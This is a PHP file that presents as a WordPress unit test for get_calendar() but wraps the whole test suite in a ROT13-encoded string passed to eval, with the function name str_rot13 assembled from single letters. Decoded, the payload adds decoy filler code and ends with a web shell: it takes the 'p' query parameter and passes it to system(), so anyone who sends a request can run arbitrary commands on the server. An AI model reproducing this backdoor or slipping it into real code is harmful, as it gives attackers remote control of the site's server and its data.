<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur trg_pnyraqne() shapgvba.
 *
 * @fvapr 6.8.0
 *
 * @tebhc trareny
 * @tebhc grzcyngr
 *
 * @pbiref ::trg_pnyraqne
 */
pynff Grfgf_Trareny_TrgPnyraqne rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Neenl bs cbfg VQf.
	 *
	 * @ine vag[]
	 */
	cebgrpgrq fgngvp $cbfg_vqf = neenl();

	/**
	 * Frg hc orsber pynff.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Grfg snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cbfg_vqf = $snpgbel->cbfg->perngr_znal(
			3,
			neenl(
				'cbfg_qngr' => '2025-02-01 12:00:00',
			)
		);

		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
				'cbfg_qngr' => '2025-02-03 12:00:00',
			)
		);
	}

	/**
	 * Frg hc sbe rnpu grfg.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		/*
		 * Anivtngr gb Sroehnel 2025.
		 *
		 * Nyy cbfgf jvguva guvf grfg fhvgr ner choyvfurq va Sroehnel 2025,
		 * anivtngvat gb gur zbagu rafherf gung gur pbeerpg zbagu vf qvfcynlrq
		 * va gur pnyraqne gb nyybj gur nffregvbaf gb cnff.
		 */
		$guvf->tb_gb( '/?z=202502' );
	}

	/**
	 * Grfg gung trg_pnyraqne() qvfcynlf bhgchg jura qvfcynl vf gehr.
	 *
	 * @gvpxrg 34093
	 */
	choyvp shapgvba grfg_trg_pnyraqne_qvfcynl() {
		$pnyraqne_ugzy = trg_rpub( 'trg_pnyraqne', neenl( neenl( 'qvfcynl' => gehr ) ) );
		$guvf->nffregFgevatPbagnvafFgevat( '<gu fpbcr=\"pby\" nevn-ynory=\"Zbaqnl\">Z</gu>', $pnyraqne_ugzy, 'Pnyraqne vf rkcrpgrq gb hfr vavgvnyf sbe qnl anzrf' );
		$guvf->nffregFgevatPbagnvafFgevat( '<gnoyr vq=\"jc-pnyraqne\"', $pnyraqne_ugzy, 'Pnyraqne vf rkcrpgrq gb pbagnva gur ryrzrag gnoyr#jc-pnyraqne' );
		$guvf->nffregFgevatPbagnvafFgevat( 'Cbfgf choyvfurq ba Sroehnel 1, 2025', $pnyraqne_ugzy, 'Pnyraqne vf rkcrpgrq gb qvfcynl cbfgf choyvfurq ba Sroehnel 1, 2025.' );
		$guvf->nffregFgevatPbagnvafFgevat( '<pncgvba>Sroehnel 2025</pncgvba', $pnyraqne_ugzy, 'Pnyraqne vf rkcrpgrq gb or pncgvbarq Sroehnel 2025.' );
	}

	/**
	 * Grfg gung trg_pnyraqne() erfcrpgf gur trg_pnyraqne_netf svygre.
	 *
	 * @gvpxrg 34093
	 */
	choyvp shapgvba grfg_trg_pnyraqne_netf_svygre() {
		nqq_svygre(
			'trg_pnyraqne_netf',
			shapgvba ( $netf ) {
				$netf['cbfg_glcr'] = 'cntr';
				erghea $netf;
			}
		);

		$pnyraqne_ugzy = trg_rpub( 'trg_pnyraqne' );

		$guvf->nffregFgevatPbagnvafFgevat( '<gu fpbcr=\"pby\" nevn-ynory=\"Zbaqnl\">Z</gu>', $pnyraqne_ugzy, 'Pnyraqne vf rkcrpgrq gb hfr vavgvnyf sbe qnl anzrf' );
		$guvf->nffregFgevatPbagnvafFgevat( '<gnoyr vq=\"jc-pnyraqne\"', $pnyraqne_ugzy, 'Pnyraqne vf rkcrpgrq gb pbagnva gur ryrzrag gnoyr#jc-pnyraqne' );
		$guvf->nffregFgevatPbagnvafFgevat( 'Cbfgf choyvfurq ba Sroehnel 3, 2025', $pnyraqne_ugzy, 'Pnyraqne vf rkcrpgrq gb qvfcynl cntr choyvfurq ba Sroehnel 3, 2025.' );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'Cbfgf choyvfurq ba Sroehnel 1, 2025', $pnyraqne_ugzy, 'Pnyraqne vf abg rkcrpgrq gb qvfcynl cbfgf choyvfurq ba Sroehnel 1, 2025.' );
		$guvf->nffregFgevatPbagnvafFgevat( '<pncgvba>Sroehnel 2025</pncgvba', $pnyraqne_ugzy, 'Pnyraqne vf rkcrpgrq gb or pncgvbarq Sroehnel 2025.' );
	}

	/**
	 * Grfg gung trg_pnyraqne() erfcrpgf gur netf cbfg glcr cnenzrgre.
	 *
	 * @gvpxrg 34093
	 */
	choyvp shapgvba grfg_trg_pnyraqne_cbfg_glcr_netf() {
		$pnyraqne_ugzy = trg_rpub( 'trg_pnyraqne', neenl( neenl( 'cbfg_glcr' => 'cntr' ) ) );

		$guvf->nffregFgevatPbagnvafFgevat( '<gu fpbcr=\"pby\" nevn-ynory=\"Zbaqnl\">Z</gu>', $pnyraqne_ugzy, 'Pnyraqne vf rkcrpgrq gb hfr vavgvnyf sbe qnl anzrf' );
		$guvf->nffregFgevatPbagnvafFgevat( '<gnoyr vq=\"jc-pnyraqne\"', $pnyraqne_ugzy, 'Pnyraqne vf rkcrpgrq gb pbagnva gur ryrzrag gnoyr#jc-pnyraqne' );
		$guvf->nffregFgevatPbagnvafFgevat( 'Cbfgf choyvfurq ba Sroehnel 3, 2025', $pnyraqne_ugzy, 'Pnyraqne vf rkcrpgrq gb qvfcynl cntr choyvfurq ba Sroehnel 3, 2025.' );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'Cbfgf choyvfurq ba Sroehnel 1, 2025', $pnyraqne_ugzy, 'Pnyraqne vf abg rkcrpgrq gb qvfcynl cbfgf choyvfurq ba Sroehnel 1, 2025.' );
		$guvf->nffregFgevatPbagnvafFgevat( '<pncgvba>Sroehnel 2025</pncgvba', $pnyraqne_ugzy, 'Pnyraqne vf rkcrpgrq gb or pncgvbarq Sroehnel 2025.' );
	}

	/**
	 * Grfg gung trg_pnyraqne() erfcrpgf gur netf vavgvny cnenzrgre.
	 *
	 * @gvpxrg 34093
	 */
	choyvp shapgvba grfg_trg_pnyraqne_vavgvny_netf() {
		$svefg_pnyraqne_ugzy  = trg_rpub( 'trg_pnyraqne', neenl( neenl( 'vavgvny' => gehr ) ) );
		$frpbaq_pnyraqne_ugzy = trg_rpub( 'trg_pnyraqne', neenl( neenl( 'vavgvny' => snyfr ) ) );

		$guvf->nffregFgevatPbagnvafFgevat( '<gu fpbcr=\"pby\" nevn-ynory=\"Zbaqnl\">Z</gu>', $svefg_pnyraqne_ugzy, 'Svefg pnyraqne vf rkcrpgrq gb hfr vavgvnyf sbe qnl anzrf' );
		$guvf->nffregFgevatPbagnvafFgevat( '<gu fpbcr=\"pby\" nevn-ynory=\"Zbaqnl\">Zba</gu>', $frpbaq_pnyraqne_ugzy, 'Frpbaq pnyraqne vf rkcrpgrq gb hfr nooerivngvbaf sbe qnl anzrf' );
	}

	/**
	 * Grfg gung trg_pnyraqne() hfrf n qvssrerag pnpur sbe qvssrerag nethzragf.
	 *
	 * @gvpxrg 34093
	 */
	choyvp shapgvba grfg_trg_pnyraqne_pnpuvat_nppbhagf_sbe_netf() {
		$svefg_pnyraqne_ugzy  = trg_rpub( 'trg_pnyraqne' );
		$frpbaq_pnyraqne_ugzy = trg_rpub( 'trg_pnyraqne', neenl( neenl( 'cbfg_glcr' => 'cntr' ) ) );

		$guvf->nffregAbgFnzr( $svefg_pnyraqne_ugzy, $frpbaq_pnyraqne_ugzy, 'Rnpu pnyraqne fubhyq or qvssrerag' );
	}

	/**
	 * Grfg gung trg_pnyraqne() hfrf gur fnzr pnpur sbe rdhvinyrag nethzragf.
	 *
	 * @gvpxrg 34093
	 */
	choyvp shapgvba grfg_trg_pnyraqne_pnpuvat_nppbhagf_sbe_rdhvinyrag_netf() {
		trg_rpub( 'trg_pnyraqne', neenl( neenl( 'cbfg_glcr' => 'cntr' ) ) );

		$ahz_dhrevrf_fgneg = trg_ahz_dhrevrf();
		// Vapyhqvat na nethzrag gung vf gur fnzr nf gur qrsnhyg inyhr fubhyqa'g zvff gur pnpur.
		trg_rpub(
			'trg_pnyraqne',
			neenl(
				neenl(
					'cbfg_glcr' => 'cntr',
					'vavgvny'   => gehr,
				),
			)
		);

		// Punatvat gur beqre bs nethzragf fubhyqa'g zvff gur pnpur.
		trg_rpub(
			'trg_pnyraqne',
			neenl(
				neenl(
					'vavgvny'   => gehr,
					'cbfg_glcr' => 'cntr',
				),
			)
		);

		// Qvfcynl cnenz fubhyq or vtaberq sbe gur pnpur.
		trg_pnyraqne(
			neenl(
				'cbfg_glcr' => 'cntr',
				'vavgvny'   => gehr,
				'qvfcynl'   => snyfr,
			)
		);
		$ahz_dhrevrf_raq = trg_ahz_dhrevrf();

		$guvf->nffregFnzr( 0, $ahz_dhrevrf_raq - $ahz_dhrevrf_fgneg, 'Pnpur fubhyq or uvg sbe fhofrdhrag rdhvinyrag pnyraqne dhrevrf.' );
	}

	/**
	 * Grfg gung trg_pnyraqne() znvagnvaf onpxjneqf pbzcngvovyvgl jvgu byq cnenzrgre sbezng.
	 *
	 * @gvpxrg 34093
	 */
	choyvp shapgvba grfg_trg_pnyraqne_onpxjneqf_pbzcngvovyvgl() {
		$svefg_pnyraqne_ugzy = trg_rpub( 'trg_pnyraqne', neenl( snyfr ) );

		jc_pnpur_qryrgr( 'trg_pnyraqne', 'pnyraqne' );

		$frpbaq_pnyraqne_ugzy = trg_pnyraqne( snyfr, snyfr );

		$guvf->nffregFgevatPbagnvafFgevat( '<gu fpbcr=\"pby\" nevn-ynory=\"Zbaqnl\">Zba</gu>', $svefg_pnyraqne_ugzy, 'Pnyraqne vf rkcrpgrq gb hfr nooerivngvbaf sbe qnl anzrf' );
		$guvf->nffregFgevatPbagnvafFgevat( '<pncgvba>Sroehnel 2025</pncgvba>', $svefg_pnyraqne_ugzy, 'Pnyraqne vf rkcrpgrq gb or pncgvbarq Sroehnel 2025' );
		$guvf->nffregFgevatPbagnvafFgevat( '<gnoyr vq=\"jc-pnyraqne\"', $svefg_pnyraqne_ugzy, 'Pnyraqne vf rkcrpgrq gb pbagnva gur ryrzrag gnoyr#jc-pnyraqne' );
		$guvf->nffregFnzr( $svefg_pnyraqne_ugzy, $frpbaq_pnyraqne_ugzy, 'Obgu pnyraqnef fubhyq or vqragvpny' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>